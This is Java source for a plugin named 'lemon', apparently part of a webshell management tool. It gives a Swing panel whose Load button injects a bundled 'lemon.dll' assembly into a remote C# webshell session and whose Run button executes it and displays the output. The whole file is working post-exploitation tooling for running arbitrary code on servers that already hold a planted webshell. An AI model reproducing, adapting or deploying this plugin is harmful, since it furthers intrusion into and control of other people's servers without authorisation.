package shells.plugins.cshap;

import core.Encoding;
import core.annotation.PluginnAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginnAnnotation(
   payloadName = "CShapDynamicPayload",
   Name = "lemon"
)
public class ShapWeb implements Plugin {
   private static final String CLASS_NAME = "lemon.Run";
   private JPanel panel = new JPanel(new BorderLayout());
   private JButton loadButton = new JButton("Load");
   private JButton runButton = new JButton("Run");
   private JSplitPane splitPane = new JSplitPane();
   private RTextArea resultTextArea = new RTextArea();
   private boolean loadState;
   private ShellEntity shellEntity;
   private Payload payload;
   private Encoding encoding;

   public ShapWeb() {
      this.splitPane.setOrientation(0);
      this.splitPane.setDividerSize(0);
      JPanel topPanel = new JPanel();
      topPanel.add(this.loadButton);
      topPanel.add(this.runButton);
      this.splitPane.setTopComponent(topPanel);
      this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
      this.splitPane.addComponentListener(new ComponentAdapter() {
         public void componentResized(ComponentEvent e) {
            ShapWeb.this.splitPane.setDividerLocation(0.15D);
         }
      });
      this.panel.add(this.splitPane);
   }

   private void loadButtonClick(ActionEvent actionEvent) {
      if (!this.loadState) {
         try {
            InputStream inputStream = this.getClass().getResourceAsStream("assets/lemon.dll");
            byte[] data = functions.readInputStream(inputStream);
            inputStream.close();
            if (this.payload.include("lemon.Run", data)) {
               this.loadState = true;
               JOptionPane.showMessageDialog(this.panel, "Load success", "提示", 1);
            } else {
               JOptionPane.showMessageDialog(this.panel, "Load fail", "提示", 2);
            }
         } catch (Exception var4) {
            Log.error(var4);
            JOptionPane.showMessageDialog(this.panel, var4.getMessage(), "提示", 2);
         }
      } else {
         JOptionPane.showMessageDialog(this.panel, "Loaded", "提示", 1);
      }

   }

   private void runButtonClick(ActionEvent actionEvent) {
      byte[] result = this.payload.evalFunc("lemon.Run", "run", new ReqParameter());
      this.resultTextArea.setText(this.encoding.Decoding(result));
   }

   public void init(ShellEntity shellEntity) {
      this.shellEntity = shellEntity;
      this.payload = this.shellEntity.getPayloadModel();
      this.encoding = Encoding.getEncoding(this.shellEntity);
      automaticBindClick.bindJButtonClick(this, this);
   }

   public JPanel getView() {
      return this.panel;
   }
}
